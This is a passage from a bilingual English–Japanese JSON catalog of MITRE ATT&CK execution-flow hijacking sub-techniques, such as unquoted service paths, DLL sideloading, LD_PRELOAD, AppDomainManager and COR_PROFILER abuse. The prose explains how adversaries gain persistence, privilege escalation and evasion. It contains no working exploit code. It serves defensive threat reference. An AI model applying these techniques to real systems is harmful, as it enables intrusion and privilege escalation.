EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                        "description_jp": "攻撃者は、インストーラーによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。これらのプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。ターゲットバイナリを含むファイルシステムディレクトリのアクセス許可、またはバイナリ自体のアクセス許可が不適切に設定されている場合、ターゲットバイナリはユーザーレベルのアクセス許可を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いアクセス許可レベルで実行されている場合、置き換えられたバイナリもSYSTEMを含むより高いレベルのアクセス許可で実行されます。\n\nこのテクニックの別のバリエーションは、実行可能ファイル形式の自己解凍インストーラーに共通する脆弱性を利用することによって実行できます。インストールプロセス中、インストーラーがDLL、EXE、またはその他のペイロードなどのバイナリを展開するために<code>%TEMP%</code>ディレクトリ内のサブディレクトリを使用するのが一般的です。インストーラーがサブディレクトリとファイルを作成するとき、書き込みアクセスを制限するための適切なアクセス許可をしばしば設定しないため、サブディレクトリに配置された信頼できないコードの実行や、インストールプロセスで使用されるバイナリの上書きが可能になります。この動作は[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序ハイジャックに関連しており、これを利用する可能性があります。\n\n攻撃者はこのテクニックを使用して、より高い権限レベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換える可能性があります。一部のインストーラーは、攻撃者が制御するコードを実行する際に権限昇格をもたらす昇格された権限を必要とする場合もあります。この動作は[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)に関連しています。既存の一般的なインストーラーにおけるこの脆弱性のいくつかの例がソフトウェアベンダーに報告されています。(引用: mozilla_sec_adv_2012) (引用: Executable Installers are Vulnerable) 実行中のプロセスが特定の時間に実行されるように設定されている場合、または特定のイベント（システムの起動など）中に実行されるように設定されている場合、このテクニックは永続化にも使用できます。"
                    },
                    {
                        "id": "T1574.009",
                        "name_eng": "Path Interception by Unquoted Path",
                        "name_jp": "引用符なしパスによるパスインターセプション",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
                        "description_jp": "攻撃者は、脆弱なファイルパス参照をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。攻撃者は、パス内の上位ディレクトリに実行可能ファイルを配置することにより、周囲に引用符がないパスを利用して、Windowsが攻撃者の実行可能ファイルを選択して起動するように仕向けることができます。\n\nサービスパス（引用: Microsoft CurrentControlSet Services）およびショートカットパスも、パスに1つ以上のスペースがあり、引用符で囲まれていない場合（例：<code>C:\\unsafe path with space\\program.exe</code> 対 <code>\"C:\\safe path with space\\program.exe\"</code>）、パスインターセプションに対して脆弱である可能性があります。(引用: Help eliminate unquoted path)（Windowsレジストリキーに格納）攻撃者はパスの上位ディレクトリに実行可能ファイルを配置でき、Windowsは意図した実行可能ファイルの代わりにその実行可能ファイルを解決します。例えば、ショートカットのパスが<code>C:\\program files\\myapp.exe</code>である場合、攻撃者は<code>C:\\program.exe</code>にプログラムを作成し、意図したプログラムの代わりに実行させることができます。(引用: Windows Unquoted Services) (引用: Windows Privilege Escalation Guide)\n\nこのテクニックは、実行可能ファイルが定期的に呼び出される場合に永続性のために使用でき、また、傍受された実行可能ファイルがより高い権限を持つプロセスによって開始される場合には権限昇格のために使用できます。"
                    },
                    {
                        "id": "T1574.004",
                        "name_eng": "Dylib Hijacking",
                        "name_jp": "Dylibハイジャック",
                        "description_eng": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
                        "description_jp": "攻撃者は、被害者のアプリケーションが実行時に検索するパスに、予想される名前の悪意のあるダイナミック・ライブラリ（dylib）を配置することで、独自のペイロードを実行する可能性があります。ダイナミック・ローダーは、検索パスの順序に基づいて、dylib を見つけようとします。ディリブへのパスの先頭には <code>@rpath</code> を付けることができ、開発者は相対パスを使用して実行可能ファイルの場所に基づいて実行時に使用される検索パスの配列を指定することができます。 さらに、<code>LC_LOAD_WEAK_DYLIB</code> 関数のような弱いリンクが使用されている場合、期待される dylib が存在しなくてもアプリケーションは実行されます。弱いリンクによって、開発者は新しいAPIが追加されたときに、複数のmacOSバージョンでアプリケーションを実行することができます。\n\n攻撃者は、特定されたパスに欠落している dylib の名前を持つ悪意のある dylib を挿入することで、実行を獲得する可能性があります（引用：Wardle Dylib Hijack Vulnerable Apps）（引用：Wardle Dylib Hijacking OSX 2015）（引用：Github EmpireProject HijackScanner）（引用：Github EmpireProject CreateHijacker Dylib） dylib はアプリケーションのアドレス空間にロードされ、悪意のある dylib がアプリケーションの特権レベルとリソースを継承できるようになります。アプリケーションによっては、特権の昇格や無制限のネットワークアクセスを引き起こす可能性があります。この方法は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品からの検出を回避することもできます。(引用：Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)"
                    },
                    {
                        "id": "T1574.006",
                        "name_eng": "Dynamic Linker Hijacking",
                        "name_jp": "ダイナミックリンカーハイジャック",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",
                        "description_jp": "攻撃者は、ダイナミックリンカーが共有ライブラリをロードするために使用する環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムの実行準備段階で、ダイナミックリンカーは、Linux の <code>LD_PRELOAD</code> や macOS の <code>DYLD_INSERT_LIBRARIES</code> など、さまざまな環境変数やファイルから共有ライブラリの指定された絶対パスをロードします。(引用: TheEvilBit DYLD_INSERT_LIBRARIES)(引用: Timac DYLD_INSERT_LIBRARIES)(引用: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) 環境変数で指定されたライブラリは、同じ関数名のシステムライブラリよりも優先して最初にロードされます。(引用: Man LD.SO)(引用: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) 各プラットフォームのリンカーは、実行のさまざまな時点で環境変数の広範なリストを使用します。これらの変数は、開発者が再コンパイルすることなくバイナリをデバッグしたり、マップされたシンボルの競合を解除したり、元のライブラリにカスタム関数を実装したりするために、しばしば使用される(引用: Baeldung LD_PRELOAD)\n\nダイナミック・リンカー変数をハイジャックすると、被害者プロセスのメモリ、システム/ネットワーク・リソースへのアクセスが許可され、特権が昇格する可能性があります。Linux では、敵対者は <code>LD_PRELOAD</code> を設定して、被害者プログラムによって要求された正当なライブラリの名前と一致する悪意のあるライブラリを指すようにし、被害者プログラムの実行時にオペレーティングシステムに敵対者の悪意のあるコードをロードさせる可能性があります。例えば、敵は <code>LD_PRELOAD</code> を使って <code>sshd</code> デーモンのすべての子孫プロセスに悪意のあるライブラリを注入し、結果として正規のプロセスで実行させる。実行中のサブプロセスが <code>execve</code> 関数を呼び出すと、ディスク上のシステムライブラリに含まれるシステム関数 <code>execve</code> ではなく、悪意のあるライブラリの <code>execve</code> 関数が実行される。<code>execve</code>や<code>readdir</code>などのシステム関数をフックすることで、マルウェアが<code>ls</code>、<code>ldd</code>、<code>iptables</code>、<code>dmesg</code>などのコマンドの結果から自身のアーティファクトをスクラブすることが可能になるため、敵対者は検出から[アーティファクトを隠す](https://attack.mitre.org/techniques/T1564)ことができる(引用：ESET Ebury Oct 2017)(引用：Intezer Symbiote 2022)(引用：Elastic Security Labs Pumakit 2024)\n\n動的リンカー変数をハイジャックすることで、被害者プロセスのメモリ、システム/ネットワークリソースへのアクセスが許可され、特権が昇格する可能性があります。"
                    },
                    {
                        "id": "T1574.014",
                        "name_eng": "AppDomainManager",
                        "name_jp": "AppDomainManager",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",
                        "description_jp": "攻撃者は、.NET の `AppDomainManager` がアセンブリをロードする方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。.NETフレームワークは、`AppDomainManager`クラスを使用して、.NETアプリケーションの実行をホストするプロセス内に1つ以上の隔離された実行環境（アプリケーションドメインと呼ばれる）を作成し、管理します。アセンブリ（.NETコードとして実行するためにコンパイルされた`.exe`または`.dll`バイナリ）は、実行可能コードとしてアプリケーションドメインにロードすることができる（引用：Microsoft App Domains）。\n\n「AppDomainManagerインジェクション」として知られるこの攻撃は、.NETアプリケーションがアセンブリをロードする方法をハイジャックすることで、任意のコードを実行する可能性があります。例えば、マルウェアはターゲットプロセス内にカスタムアプリケーションドメインを作成し、任意のアセンブリをロードして実行します。あるいは、.NET ランタイム設定を定義する設定ファイル (`.config`) やプロセス環境変数が改ざんされ、悪意のあるアセンブリ (名前で識別される) をターゲットプロセスにロードするよう、良性の .NET アプリケーションに指示することもあります。(引用: PenTestLabs AppDomainManagerInject)(引用: PwC Yellow Liderc)(引用: Rapid7 AppDomain Manager Injection)"
                    },
                    {
                        "id": "T1574.001",
                        "name_eng": "DLL",
                        "name_jp": "DLL",
                        "description_eng": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)\n\nSpecific ways DLLs are abused by adversaries include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).\n\nSide-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nAdversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)\n\n### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)\n\n### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)\n\n### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)\n\n### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)\n\nPrograms that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.\n\nRemote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)\n\nIf a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
                        "description_jp": "攻撃者は、永続性を実現し、特権を昇格させ、防御を回避するために、ダイナミック・リンク・ライブラリ・ファイル（DLL）を悪用する可能性がある。DLLは、複数のプログラムで同時に利用できるコードとデータを含むライブラリである。DLLは本来悪意のあるものではないが、サイドローディング、検索順序の乗っ取り、ファントムDLLハイジャックなどのメカニズムによって悪用される可能性がある(引用：unit 42)。\n\nDLLが敵対者によって悪用される具体的な方法には、次のようなものがある：\n\n### DLL サイドローディング\nDLLのサイドローディング 敵は、DLLをサイドローディングすることで、独自の悪意のあるペイロードを実行する可能性があります。サイドローディングは、プログラムがロードする DLL を植え付け、ペイロードを実行する正規のアプリケーションを起動することで、DLL を乗っ取ることを意味します。\n\nサイドローディングは、被害者アプリケーションと悪意のあるペイロードの両方を、互いに隣り合わせに配置します。攻撃者はサイドローディングを、正規の、信頼された、潜在的に昇格されたシステムまたはソフトウェアプロセスの下で実行するアクションを隠す手段として使用している可能性が高いです。ペイロードのサイドローディングに使用される良性の実行ファイルは、配信中や実行中にフラグが立てられない可能性があります。敵対的なペイロードは、信頼されたプロセスのメモリにロードされるまで、暗号化/パックされるか、または他の方法で難読化される可能性もあります。\n\n攻撃者は、BPL (Borland Package Library) などの他のパッケージをサイドロードすることもあります(引用: kroll bpl)。\n\n### DLL 検索順序のハイジャック\n攻撃者は、Windows が DLL をロードする際に使用する検索順序をハイジャックすることで、独自の悪質なペイロードを実行する可能性があります。この検索順序は、DLL をロードする際にプログラムがチェックする、特別な検索場所と標準的な検索場所のシーケンスです。敵対者は、DLLの検索順序によって正当なライブラリの場所よりも優先されるディレクトリに、トロイの木馬のDLLを仕込むことができる。これにより、被害者プログラムによって悪意のあるDLLが呼び出されると、Windowsはそれをロードするようになる(引用：unit 42)。\n\n### DLL リダイレクト\nDLLリダイレクトは、有効化された後（レジストリまたはリダイレクトファイルの作成により）、プログラムに別の場所からDLLをロードさせる可能性があります。 引用：Microsoft リダイレクト）（引用：Microsoft - manifests/assembly\n\n### ファントム DLL ハイジャック\n攻撃者は、存在しない DLL ファイルへの参照を標的とすることで、ファントム DLL ハイジャックを利用する可能性があります。彼らは、存在しないモジュールの場所に正しい名前で悪意のある DLL を仕込むことで、独自の悪意のある DLL をロードできる可能性があります(引用: Hexacorn DLL ハイジャック)(引用: Hijack DLLs CrowdStrike)\n\n### DLL の置換\n攻撃者は、既存の有効な DLL ファイルを標的にし、有効な DLL ファイルと同じ名前と同じ場所に、自分自身の悪意のある DLL を植え付けることで、DLL を置き換える可能性があります(引用: Wietze Beukema DLL ハイジャック)。\n\nDLLハイジャックの被害に遭ったプログラムは、悪意のあるDLLが正規のDLLも読み込むように設定されているため、防御を回避して正常に動作しているように見えることがある。\n\nリモートDLLハイジャックは、DLLをロードする前にプログラムがカレントディレクトリをWeb共有などのリモートの場所に設定することで発生する可能性がある(引用：DLL pre load owasp)(引用：Microsoft remote preloading)\n\n有効なDLLがより高い特権レベルで実行されるように設定されている場合、ロードされる敵に制御されたDLLもより高いレベルで実行される。この場合、このテクニックは特権の昇格に使われる可能性がある。"
                    },
                    {
                        "id": "T1574.008",
                        "name_eng": "Path Interception by Search Order Hijacking",
                        "name_jp": "検索順ハイジャックによるパスインターセプション",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",
                        "description_jp": "攻撃者は、他のプログラムのロードに使用される検索順序をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムによってはフルパスで他のプログラムを呼び出さないものもあるため、敵は呼び出し元のプログラムがあるディレクトリに自分のファイルを置き、呼び出し元のプログラムの要求に応じてオペレーティングシステムが悪意のあるソフトウェアを起動するように仕向ける可能性があります。\n\n検索順序のハイジャックは、敵対者がWindowsがパスを与えられていないプログラムを検索する順序を悪用することで発生する。[DLL](https://attack.mitre.org/techniques/T1574/001)の検索順ハイジャックとは異なり、検索順はプログラムの実行に使用されるメソッドによって異なります。(引用: Microsoft CreateProcess) (引用: Windows NT Command Shell) (引用: Microsoft WinExec) しかし、WindowsはWindowsシステムディレクトリを検索する前に、開始プログラムのディレクトリを検索するのが一般的である。検索順序のハイジャックに対して脆弱なプログラム（すなわち、実行可能ファイルへのパスを指定しないプログラム）を見つけた敵対者は、不適切に指定されたプログラムにちなんだ名前のプログラムを作成し、それを開始プログラムのディレクトリ内に配置することによって、この脆弱性を利用することができる。\n\n例えば、「example.exe」はコマンドライン引数<code>net user</code>で「cmd.exe」を実行します。攻撃者がexample.exeと同じディレクトリに「net.exe」というプログラムを置くと、「net.exe」はWindowsのシステムユーティリティnetの代わりに実行されます。さらに、攻撃者が「net.com」というプログラムを「net.exe」と同じディレクトリに置いた場合、PATHEXTで定義された実行可能拡張子の順序により、<code>cmd.exe /C net user</code>は「net.exe」の代わりに「net.com」を実行します。(引用: Microsoft Environment Property)\n\n検索順のハイジャックもDLLのロードをハイジャックするための一般的な方法で、[DLL](https://attack.mitre.org/techniques/T1574/001)でカバーされています。"
                    },
                    {
                        "id": "T1574.011",
                        "name_eng": "Services Registry Permissions Weakness",
                        "name_jp": "サービスレジストリアクセス許可の脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                        "description_jp": "攻撃者は、サービスが使用するレジストリ・エントリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。攻撃者は、サービスに関連するレジストリ キーのパーミッションの欠陥を利用して、サービスの起動時に独自のコードを起動するために、本来指定されている実行可能ファイルから自分たちが制御する実行可能ファイルへとリダイレクトする可能性がある。Windowsは、レジストリの<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>の下にローカルサービスのコンフィギュレーション情報を格納します。サービスのレジストリキーの下に格納された情報は、サービスコントローラー、sc.exe、 [PowerShell](https://attack.mitre.org/techniques/T1059/001)、または[Reg](https://attack.mitre.org/software/S0075)のようなツールを使って、サービスの実行パラメーターを変更するために操作することができる。レジストリ・キーへのアクセスは、アクセス制御リストとユーザー権限によって制御される。(引用：レジストリキーのセキュリティ）（引用：malware_hides_service）\n\nユーザーやグループのパーミッションが適切に設定されておらず、サービスのレジストリ・キーへのアクセスを許可している場合、敵対者はサービスのbinPath/ImagePathを変更し、自分のコントロール下にある別の実行ファイルを指すようにする可能性があります。サービスが開始または再起動されると、敵が制御するプログラムが実行され、サービスが実行されるように設定されたアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、またはNetworkService）への永続化および/または特権昇格が可能になります。\n\n逆境者はまた、サービスのレジストリツリー内の他のレジストリキーを変更する可能性があります。たとえば、<code>FailureCommand</code>キーが変更され、サービスに障害が発生したり、サービスが意図的に破損したりした場合に、いつでも昇格したコンテキストでサービスが実行されるようにすることができる。 (引用：Kansa サービス関連コレクター）（引用：Tweet Registry Perms Weakness)\n\n<code>Performance</code>キーには、ドライバ サービスのパフォーマンス DLL の名前と、DLL 内のいくつかのエクスポートされた関数の名前が含まれます。(引用: microsoft_services_registry_tree) <code>Performance</code> キーがまだ存在せず、敵に制御されたユーザーが <code>Create Subkey</code> 権限を持っている場合、敵はサービスのレジストリ ツリーに悪意のある DLL を指す <code>Performance</code> キーを作成する可能性があります。(引用: insecure_reg_perms)\n\nまた、ドライバ固有のデータを格納する <code>Parameters</code> キーや、その他のカスタム サブキーを悪意のあるサービスに追加して、永続性を確立したり、その他の悪意のある活動を可能にしたりすることもできます。(引用: microsoft_services_registry_tree)(引用: troj_zegost) さらに、敵対者が svchost.exe を使用して悪意のあるサービスを起動する場合、サービスのファイルは <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code> を使用して識別される可能性があります(引用: malware_hides_service)。"
                    },
                    {
                        "id": "T1574.012",
                        "name_eng": "COR_PROFILER",
                        "name_jp": "COR_PROFILER",
                        "description_eng": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
                        "description_jp": "攻撃者は COR_PROFILER 環境変数を利用して、.NET CLR をロードするプログラムの実行フローを乗っ取る可能性があります。COR_PROFILERは.NET Frameworkの機能で、開発者は共通言語ランタイム（CLR）をロードする各.NETプロセスにロードされるアンマネージド（または.NETの外部）プロファイリングDLLを指定できます。これらのプロファイラーは、.NET CLRで実行されるマネージドコードを監視、トラブルシューティング、デバッグするために設計されています。(引用: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nCOR_PROFILER 環境変数は、さまざまなスコープ（システム、ユーザー、またはプロセス）で設定でき、その結果、影響力のレベルが異なります。システムおよびユーザー全体の環境変数スコープは、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001) (COM) オブジェクトをプロファイラ DLL として登録できるレジストリで指定されます。プロセススコープCOR_PROFILERは、レジストリを変更することなくメモリ内に作成することもできます。.NET Framework 4からは、COR_PROFILER_PATH環境変数にDLLの場所が指定されていれば、プロファイリングDLLを登録する必要はありません（引用：Microsoft COR_PROFILER 2013年2月）。\n\n攻撃者はCOR_PROFILERを悪用して、CLRが呼び出されるたびにすべての.NETプロセスのコンテキストで悪意のあるDLLを実行する永続性を確立する可能性があります。また、COR_PROFILERは、被害者である.NETプロセスがより高い権限レベルで実行されている場合、権限の昇格（例：[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)）や、フックおよび[防御の阻害](https://attack.mitre.org/techniques/T1562).NETプロセスによって提供される。(引用: RedCanary Mockingbird 2020年5月)(引用: Red Canary COR_PROFILER 2020年5月)(引用: Almond COR_PROFILER 2019年4月)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET 